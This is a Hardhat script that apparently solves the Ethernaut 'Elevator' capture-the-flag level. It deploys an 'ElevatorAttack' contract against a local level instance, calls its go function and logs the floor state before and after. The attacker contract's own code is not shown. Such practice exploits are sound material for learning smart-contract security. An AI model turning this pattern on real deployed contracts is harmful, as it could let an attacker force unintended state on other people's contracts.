import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xf41B47c54dEFF12f8fE830A411a09D865eBb120E";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Elevator",CONTRACT_ADDRESS, signer);

const attackerContractFactory = await ethers.getContractFactory("ElevatorAttack", signer);
const attackerContract = await attackerContractFactory.deploy(contract.address);

//HACK STEPS

// 1. Check current top and floor values
console.log("Are we on top floor?: ", await contract.top());
let floor = await contract.floor();
console.log("Which floor is this? ", floor.toString());

// 2. Calling attacker contract function and checking again state variables values
await attackerContract.go(5);
console.log("Are we on top floor?: ", await contract.top());
floor = await contract.floor();
console.log("Which floor is this? ", floor.toString());

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
